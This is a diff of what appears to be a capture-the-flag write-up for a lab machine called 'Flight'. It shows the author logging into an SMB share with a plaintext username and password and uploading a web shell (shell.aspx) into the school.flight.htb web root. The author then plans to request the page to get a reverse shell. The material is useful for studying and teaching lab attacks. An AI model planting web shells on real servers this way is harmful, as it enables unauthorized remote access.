@@ -509,32 +509,28 @@ penelope -p 1337
 This set me a listener
 
 ```python
-smbclient //g0.flight.htb/Web -U 'c.bum'%'Tikkycoll_431012284'
+smbclient //g0.flight.htb/Web -U 'c.bum'%'Tikkycoll_431012284'          
 Try "help" to get a list of possible commands.
-smb: \> ls
-  .                                   D        0  Wed Apr  1 00:57:00 2026
-  ..                                  D        0  Wed Apr  1 00:57:00 2026
-  flight.htb                          D        0  Wed Apr  1 00:57:00 2026
-  school.flight.htb                   D        0  Wed Apr  1 00:57:00 2026
+smb: \> cd school.flight.htb\
+smb: \school.flight.htb\> ls
+  .                                   D        0  Wed Apr  1 01:12:00 2026
+  ..                                  D        0  Wed Apr  1 01:12:00 2026
+  about.html                          A     1689  Tue Oct 25 04:54:45 2022
+  blog.html                           A     3618  Tue Oct 25 04:53:59 2022
+  home.html                           A     2683  Tue Oct 25 04:56:58 2022
+  images                              D        0  Wed Apr  1 01:12:00 2026
+  index.php                           A     2092  Thu Oct 27 08:59:25 2022
+  lfi.html                            A      179  Thu Oct 27 08:55:16 2022
+  styles                              D        0  Wed Apr  1 01:12:00 2026
 
-		5056511 blocks of size 4096. 1246223 blocks available
-smb: \> cd flight.htb\
-smb: \flight.htb\> ls
-  .                                   D        0  Wed Apr  1 00:57:00 2026
-  ..                                  D        0  Wed Apr  1 00:57:00 2026
-  css                                 D        0  Wed Apr  1 00:57:00 2026
-  images                              D        0  Wed Apr  1 00:57:00 2026
-  index.html                          A     7069  Thu Feb 24 05:58:10 2022
-  js                                  D        0  Wed Apr  1 00:57:00 2026
-
-		5056511 blocks of size 4096. 1246207 blocks available
-smb: \flight.htb\> put shell.aspx
-putting file shell.aspx as \flight.htb\shell.aspx (75.2 kB/s) (average 75.2 kB/s)
-smb: \flight.htb\> 
+		5056511 blocks of size 4096. 1245550 blocks available
+smb: \school.flight.htb\> put shell.aspx
+putting file shell.aspx as \school.flight.htb\shell.aspx (1394.3 kB/s) (average 1394.3 kB/s)
+smb: \school.flight.htb\>  
 ```
-This planted the shell at the root of `http://flight.htb/`
+This planted the shell at the root of `http://school.flight.htb/`
 
-Now if i access `http://flight.htb/shell.aspx` it should trigger a shell
+Now if i access `http://school.flight.htb/shell.aspx` it should trigger a shell
 
 ```python
 
